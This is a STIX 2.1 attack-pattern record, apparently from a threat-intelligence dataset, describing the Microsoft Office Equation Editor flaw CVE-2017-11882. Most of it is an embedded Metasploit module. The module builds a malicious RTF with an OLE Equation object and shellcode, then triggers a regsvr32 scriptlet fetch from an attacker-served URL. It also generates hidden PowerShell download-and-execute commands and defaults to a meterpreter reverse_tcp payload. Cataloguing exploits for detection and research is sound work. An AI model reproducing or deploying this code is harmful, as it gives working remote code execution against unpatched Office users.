{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--59716206-93b2-4d93-b36e-073c3aad7956",
    "created": "2024-08-14T16:35:48.028944Z",
    "modified": "2024-08-14T16:35:48.028949Z",
    "name": "Microsoft Office CVE-2017-11882",
    "description": " Module exploits a flaw in how the Equation Editor that allows an attacker to execute arbitrary code in RTF files without interaction. The vulnerability is caused by the Equation Editor to which fails to properly handle OLE objects in memory. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/office_ms17_11882.rb",
            "external_id": "office_ms17_11882.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-11882"
        },
        {
            "source_name": "reference",
            "url": "https://embedi.com/blog/skeleton-closet-ms-office-vulnerability-you-didnt-know-about"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/embedi/CVE-2017-11882"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ManualRanking\n\n  include Msf::Exploit::Remote::HttpServer\n  include Msf::Exploit::Powershell\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FILEFORMAT\n\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name' => 'Microsoft Office CVE-2017-11882',\n      'Description' => %q{\n        Module exploits a flaw in how the Equation Editor that\n        allows an attacker to execute arbitrary code in RTF files without\n        interaction. The vulnerability is caused by the Equation Editor,\n        to which fails to properly handle OLE objects in memory.\n      },\n      'Author' => ['mumbai', 'embedi'],\n      'License' => MSF_LICENSE,\n      'DisclosureDate' => '2017-11-15',\n      'References' => [\n        ['CVE', '2017-11882'],\n        ['URL', 'https://embedi.com/blog/skeleton-closet-ms-office-vulnerability-you-didnt-know-about'],\n        ['URL', 'https://github.com/embedi/CVE-2017-11882']\n      ],\n      'Platform' => 'win',\n      'Arch' => [ARCH_X86, ARCH_X64],\n      'Targets' => [\n        ['Microsoft Office', {} ],\n      ],\n      'DefaultTarget' => 0,\n      'Payload' => {\n        'DisableNops' => true\n      },\n      'Stance' => Msf::Exploit::Stance::Aggressive,\n      'DefaultOptions' => {\n        'EXITFUNC' => 'thread',\n        'PAYLOAD' => 'windows/meterpreter/reverse_tcp'\n      }\n    ))\n\n    register_options([\n        OptString.new(\"FILENAME\", [true, \"Filename to save as, or inject\", \"msf.rtf\"]),\n        OptString.new(\"FOLDER_PATH\", [false, \"Path to file to inject\", nil])\n    ])\n  end\n\n  def retrieve_header(filename)\n    if (not datastore['FOLDER_PATH'].nil?)\n      path = \"#{datastore['FOLDER_PATH']}/#{datastore['FILENAME']}\"\n    else\n      path = nil\n    end\n    if (not path.nil?)\n      if ::File.file?(path)\n        File.open(path, 'rb') do |fd|\n          header = fd.read(fd.stat.size).split('{\\*\\datastore').first\n          header = header.to_s # otherwise I get nil class...\n          print_status(\"Injecting #{path}...\")\n          return header\n        end\n      else\n        header = '{\\rtf1\\ansi\\ansicpg1252\\deff0\\nouicompat\\deflang1033{\\fonttbl{\\f0\\fnil\\fcharset0 Calibri;}}' + \"\\n\"\n        header << '{\\*\\generator Riched20 6.3.9600}\\viewkind4\\uc1' + \"\\n\"\n        header << '\\pard\\sa200\\sl276\\slmult1\\f0\\fs22\\lang9'\n      end\n    else\n      header = '{\\rtf1\\ansi\\ansicpg1252\\deff0\\nouicompat\\deflang1033{\\fonttbl{\\f0\\fnil\\fcharset0 Calibri;}}' + \"\\n\"\n      header << '{\\*\\generator Riched20 6.3.9600}\\viewkind4\\uc1' + \"\\n\"\n      header << '\\pard\\sa200\\sl276\\slmult1\\f0\\fs22\\lang9'\n    end\n    return header\n  end\n\n\n\n  def generate_rtf\n    header = retrieve_header(datastore['FILENAME'])\n    object_class = '{\\object\\objemb\\objupdate{\\*\\objclass Equation.3}\\objw380\\objh260{\\*\\objdata '\n    object_class << '01050000020000000b0000004571756174696f6e2e33000000000000000000000'\n    object_class << 'c0000d0cf11e0a1b11ae1000000000000000000000000000000003e000300feff'\n    object_class << '09000600000000000000000000000100000001000000000000000010000002000'\n    object_class << '00001000000feffffff0000000000000000ffffffffffffffffffffffffffffff'\n    object_class << 'fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'\n    object_class << 'fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'\n    object_class << 'fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'\n    object_class << 'fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'\n    object_class << 'fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'\n    object_class << 'fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'\n    object_class << 'fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'\n    object_class << 'fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'\n    object_class << 'fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'\n    object_class << 'fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'\n    object_class << 'fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'\n    object_class << 'fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'\n    object_class << 'fffffffffffffffffffffffffffffffffffffffffffffffffffffffdffffff040'\n    object_class << '00000fefffffffefffffffeffffffffffffffffffffffffffffffffffffffffff'\n    object_class << 'fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'\n    object_class << 'fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'\n    object_class << 'fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'\n    object_class << 'fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'\n    object_class << 'fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'\n    object_class << 'fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'\n    object_class << 'fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'\n    object_class << 'fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'\n    object_class << 'fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'\n    object_class << 'fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'\n    object_class << 'fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'\n    object_class << 'fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'\n    object_class << 'fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'\n    object_class << 'fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'\n    object_class << 'ffffffffffffffffffffffffffffffffffffff52006f006f007400200045006e0'\n    object_class << '07400720079000000000000000000000000000000000000000000000000000000'\n    object_class << '00000000000000000000000000000000000016000500ffffffffffffffff02000'\n    object_class << '00002ce020000000000c0000000000000460000000000000000000000008020ce'\n    object_class << 'a5613cd30103000000000200000000000001004f006c006500000000000000000'\n    object_class << '00000000000000000000000000000000000000000000000000000000000000000'\n    object_class << '000000000000000000000000000000000a000201ffffffffffffffffffffffff0'\n    object_class << '00000000000000000000000000000000000000000000000000000000000000000'\n    object_class << '000000000000001400000000000000010043006f006d0070004f0062006a00000'\n    object_class << '00000000000000000000000000000000000000000000000000000000000000000'\n    object_class << '0000000000000000000000000000120002010100000003000000ffffffff00000'\n    object_class << '00000000000000000000000000000000000000000000000000000000000000000'\n    object_class << '0001000000660000000000000003004f0062006a0049006e0066006f000000000'\n    object_class << '00000000000000000000000000000000000000000000000000000000000000000'\n    object_class << '00000000000000000000000012000201ffffffff04000000ffffffff000000000'\n    object_class << '00000000000000000000000000000000000000000000000000000000000000003'\n    object_class << '0000000600000000000000feffffff02000000fefffffffeffffff05000000060'\n    object_class << '0000007000000feffffffffffffffffffffffffffffffffffffffffffffffffff'\n    object_class << 'fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'\n    object_class << 'fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'\n    object_class << 'fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'\n    object_class << 'fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'\n    object_class << 'fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'\n    object_class << 'fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'\n    object_class << 'fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'\n    object_class << 'fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'\n    object_class << 'fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'\n    object_class << 'fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'\n    object_class << 'fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'\n    object_class << 'fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'\n    object_class << 'fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'\n    object_class << 'fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'\n    object_class << 'ffffff01000002080000000000000000000000000000000000000000000000000'\n    object_class << '00000000000000000000000000000000000000000000000000000000000000000'\n    object_class << '00000100feff030a0000ffffffff02ce020000000000c00000000000004617000'\n    object_class << '0004d6963726f736f6674204571756174696f6e20332e30000c00000044532045'\n    object_class << '71756174696f6e000b0000004571756174696f6e2e3300f439b27100000000000'\n    object_class << '00000000000000000000000000000000000000000000000000000000000000000'\n    object_class << \"00000300040000000000000000000000000000000000000000000000000000000\"\n    object_class << \"000000000000000000000000000000000000000000000000000000000000000\\n\"\n\n\n    shellcode = \"\\x1c\\x00\"                  #  0:   1c 00                   sbb    al,0x0\n    shellcode << \"\\x00\\x00\"                 #  2:   00 00                   add    BYTE PTR [eax],al\n    shellcode << \"\\x02\\x00\"                 #  4:   02 00                   add    al,BYTE PTR [eax]\n    shellcode << \"\\x9e\"                     #  6:   9e                      sahf\n    shellcode << \"\\xc4\\xa9\\x00\\x00\\x00\\x00\" #  7:   c4 a9 00 00 00 00       les    ebp,FWORD PTR [ecx+0x0]\n    shellcode << \"\\x00\\x00\"                 #  d:   00 00                   add    BYTE PTR [eax],al\n    shellcode << \"\\x00\\xc8\"                 #  f:   00 c8                   add    al,cl\n    shellcode << \"\\xa7\"                     # 11:   a7                      cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]\n    shellcode << \"\\\\\"                       # 12:   5c                      pop    esp\n    shellcode << \"\\x00\\xc4\"                 # 13:   00 c4                   add    ah,al\n    shellcode << \"\\xee\"                     # 15:   ee                      out    dx,al\n    shellcode << \"[\"                        # 16:   5b                      pop    ebx\n    shellcode << \"\\x00\\x00\"                 # 17:   00 00                   add    BYTE PTR [eax],al\n    shellcode << \"\\x00\\x00\"                 # 19:   00 00                   add    BYTE PTR [eax],al\n    shellcode << \"\\x00\\x03\"                 # 1b:   00 03                   add    BYTE PTR [ebx],al\n    shellcode << \"\\x01\\x01\"                 # 1d:   01 01                   add    DWORD PTR [ecx],eax\n    shellcode << \"\\x03\\n\"                   # 1f:   03 0a                   add    ecx,DWORD PTR [edx]\n    shellcode << \"\\n\\x01\"                   # 21:   0a 01                   or     al,BYTE PTR [ecx]\n    shellcode << \"\\x08ZZ\"                   # 23:   08 5a 5a                or     BYTE PTR [edx+0x5a],bl\n    shellcode << \"\\xB8\\x44\\xEB\\x71\\x12\"     # 26:   b8 44 eb 71 12          mov    eax,0x1271eb44\n    shellcode << \"\\xBA\\x78\\x56\\x34\\x12\"     # 2b:   ba 78 56 34 12          mov    edx,0x12345678\n    shellcode << \"\\x31\\xD0\"                 # 30:   31 d0                   xor    eax,edx\n    shellcode << \"\\x8B\\x08\"                 # 32:   8b 08                   mov    ecx,DWORD PTR [eax]\n    shellcode << \"\\x8B\\x09\"                 # 34:   8b 09                   mov    ecx,DWORD PTR [ecx]\n    shellcode << \"\\x8B\\x09\"                 # 36:   8b 09                   mov    ecx,DWORD PTR [ecx]\n    shellcode << \"\\x66\\x83\\xC1\\x3C\"         # 38:   66 83 c1 3c             add    cx,0x3c\n    shellcode << \"\\x31\\xDB\"                 # 3c:   31 db                   xor    ebx,ebx\n    shellcode << \"\\x53\"                     # 3e:   53                      push   ebx\n    shellcode << \"\\x51\"                     # 3f:   51                      push   ecx\n    shellcode << \"\\xBE\\x64\\x3E\\x72\\x12\"     # 40:   be 64 3e 72 12          mov    esi,0x12723e64\n    shellcode << \"\\x31\\xD6\"                 # 45:   31 d6                   xor    esi,edx\n    shellcode << \"\\xFF\\x16\"                 # 47:   ff 16                   call   DWORD PTR [esi]\n    shellcode << \"\\x53\"                     # 49:   53                      push   ebx\n    shellcode << \"\\x66\\x83\\xEE\\x4C\"         # 4a:   66 83 ee 4c             sub    si,0x4c\n    shellcode << \"\\xFF\\x10\"                 # 4e:   ff 10                   call   DWORD PTR [eax]\n    shellcode << \"\\x90\"                     # 50:   90                      nop\n    shellcode << \"\\x90\"                     # 50:   90                      nop\n\n    footer = '0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000'\n    footer << '4500710075006100740069006F006E0020004E006100740069007600650000000'\n    footer << '00000000000000000000000000000000000000000000000000000'\n    footer << '000000000020000200FFFFFFFFFFFFFFFFFFFFFFFF00000000000'\n    footer << '00000000000000000000000000000000000000000000000000000000000000400'\n    footer << '0000C5000000000000000000000000000000000000000000000000'\n    footer << '0000000000000000000000000000000000000000000000000000000000000000'\n    footer << '00000000000000000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFF00'\n    footer << '000000000000000000000000000000000000000000000000000000'\n    footer << '0000000000000000000000000000000000000000000000000000000000000000'\n    footer << '000000000000000000000000000000000000000000000000000000'\n    footer << '0000000000000000000000000000000000000000000000000000000000FFFFFF'\n    footer << 'FFFFFFFFFFFFFFFFFF000000000000000000000000000000000000'\n    footer << '00000000000000000000000000000000000000000000000000000000000000000'\n    footer << '00000000000000000000000000000000000000000000000000000'\n    footer << '00000000000000000000000000000000000000000000000000000000000000000'\n    footer << '0000000000000FFFFFFFFFFFFFFFFFFFFFFFF0000000000000000'\n    footer << '00000000000000000000000000000000000000000000000000000000000000000'\n    footer << '00000000000000001050000050000000D0000004D45544146494C'\n    footer << '4550494354003421000035FEFFFF9201000008003421CB010000010009000003C'\n    footer << '500000002001C0000000000050000000902000000000500000002'\n    footer << '0101000000050000000102FFFFFF00050000002E0118000000050000000B0200000000050000000C02A001201E1200000026060F001A00FFFFFFFF'\n    footer << '000010000000C0FFFFFFC6FFFFFFE01D0000660100000B00000026060F000C004D61746854797065000020001C000000FB0280FE00000000000090'\n    footer << '01000000000402001054696D6573204E657720526F6D616E00FEFFFFFF6B2C0A0700000A0000000000040000002D0100000C000000320A60019016'\n    footer << '0A000000313131313131313131310C000000320A6001100F0A000000313131313131313131310C000000320A600190070A00000031313131313131'\n    footer << '3131310C000000320A600110000A000000313131313131313131310A00000026060F000A00FFFFFFFF0100000000001C000000FB02100007000000'\n    footer << '0000BC02000000000102022253797374656D000048008A0100000A000600000048008A01FFFFFFFF7CEF1800040000002D01010004000000F00100'\n    footer << '00030000000000' + \"\\n\"\n    footer << '}{\\result{\\pict{\\*\\picprop}\\wmetafile8\\picw380\\pich260\\picwgoal380\\pichgoal260' + \"\\n\"\n    footer << \"0100090000039e00000002001c0000000000050000000902000000000500000002010100000005\\n\"\n    footer << \"0000000102ffffff00050000002e0118000000050000000b0200000000050000000c02a0016002\\n\"\n    footer << \"1200000026060f001a00ffffffff000010000000c0ffffffc6ffffff20020000660100000b0000\\n\"\n    footer << \"0026060f000c004d61746854797065000020001c000000fb0280fe000000000000900100000000\\n\"\n    footer << \"0402001054696d6573204e657720526f6d616e00feffffff5f2d0a6500000a0000000000040000\\n\"\n    footer << \"002d01000009000000320a6001100003000000313131000a00000026060f000a00ffffffff0100\\n\"\n    footer << \"000000001c000000fb021000070000000000bc02000000000102022253797374656d000048008a\\n\"\n    footer << \"0100000a000600000048008a01ffffffff6ce21800040000002d01010004000000f00100000300\\n\"\n    footer << \"00000000\\n\"\n    footer << \"}}}\\n\"\n    footer << '\\par}' + \"\\n\"\n\n\n    payload = shellcode\n    payload += [0x00402114].pack(\"V\")\n    payload += \"\\x00\" * 2\n    payload += \"regsvr32 /s /n /u /i:#{get_uri}.sct scrobj.dll\"\n    payload = (payload + (\"\\x00\" * (197 - payload.length))).unpack('H*').first\n    payload = header + object_class + payload + footer\n    payload\n  end\n\n\n\n  def gen_psh(url, *method)\n    ignore_cert = Rex::Powershell::PshMethods.ignore_ssl_certificate if ssl\n\n    if method.include? 'string'\n      download_string = datastore['PSH-Proxy'] ? (Rex::Powershell::PshMethods.proxy_aware_download_and_exec_string(url)) : (Rex::Powershell::PshMethods.download_and_exec_string(url))\n    else\n      # Random filename to use, if there isn't anything set\n      random = \"#{rand_text_alphanumeric 8}.exe\"\n      # Set filename (Use random filename if empty)\n      filename = datastore['BinaryEXE-FILENAME'].blank? ? random : datastore['BinaryEXE-FILENAME']\n\n      # Set path (Use %TEMP% if empty)\n      path = datastore['BinaryEXE-PATH'].blank? ? \"$env:temp\" : %Q('#{datastore['BinaryEXE-PATH']}')\n\n      # Join Path and Filename\n      file = %Q(echo (#{path}+'\\\\#{filename}'))\n\n      # Generate download PowerShell command\n      download_string = Rex::Powershell::PshMethods.download_run(url, file)\n    end\n\n    download_and_run = \"#{ignore_cert}#{download_string}\"\n\n    # Generate main PowerShell command\n    return generate_psh_command_line(noprofile: true, windowstyle: 'hidden', command: download_and_run)\n  end\n\n  def on_request_uri(cli, _request)\n    if _request.raw_uri =~ /\\.sct$/\n      print_status(\"Handling request for .sct from #{cli.peerhost}\")\n      payload = gen_psh(\"#{get_uri}\", \"string\")\n      data = gen_sct_file(payload)\n      send_response(cli, data, 'Content-Type' => 'text/plain')\n    else\n      print_status(\"Delivering payload to #{cli.peerhost}...\")\n      p = regenerate_payload(cli)\n      data = cmd_psh_payload(p.encoded,\n                       payload_instance.arch.first,\n                       remove_comspec: true,\n                       exec_in_place: true\n      )\n      send_response(cli, data, 'Content-Type' => 'application/octet-stream')\n    end\n  end\n\n\n  def rand_class_id\n    \"#{Rex::Text.rand_text_hex 8}-#{Rex::Text.rand_text_hex 4}-#{Rex::Text.rand_text_hex 4}-#{Rex::Text.rand_text_hex 4}-#{Rex::Text.rand_text_hex 12}\"\n  end\n\n\n  def gen_sct_file(command)\n    # If the provided command is empty, a correctly formatted response is still needed (otherwise the system raises an error).\n    if command == ''\n      return %{<?XML version=\"1.0\"?><scriptlet><registration progid=\"#{Rex::Text.rand_text_alphanumeric 8}\" classid=\"{#{rand_class_id}}\"></registration></scriptlet>}\n    # If a command is provided, tell the target system to execute it.\n    else\n      return %{<?XML version=\"1.0\"?><scriptlet><registration progid=\"#{Rex::Text.rand_text_alphanumeric 8}\" classid=\"{#{rand_class_id}}\"><script><![CDATA[ var r = new ActiveXObject(\"WScript.Shell\").Run(\"#{command}\",0);]]></script></registration></scriptlet>}\n    end\n  end\n\n\n  def primer\n    file_create(generate_rtf)\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-11-15",
    "x_mitre_platforms": [
        "win'"
    ]
}